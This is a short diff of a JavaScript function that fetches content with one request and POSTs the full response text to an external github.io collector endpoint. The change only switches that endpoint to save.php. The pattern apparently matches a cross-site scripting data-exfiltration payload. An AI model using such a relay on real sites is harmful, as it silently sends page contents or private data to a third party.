@@ -15,7 +15,7 @@ function loadXMLDoc() {
     xhr1.onreadystatechange = function() {
         if (xhr1.readyState == 4 && xhr1.status == 200) {
             var datas = xhr1.responseText;
-            xhr2.open("POST", "https://chunliunai.github.io/", "true");
+            xhr2.open("POST", "https://chunliunai.github.io/save.php", "true");
             alert('3');
             xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded;charset=utf-8");
             xhr2.send("T1=" + escape(datas));
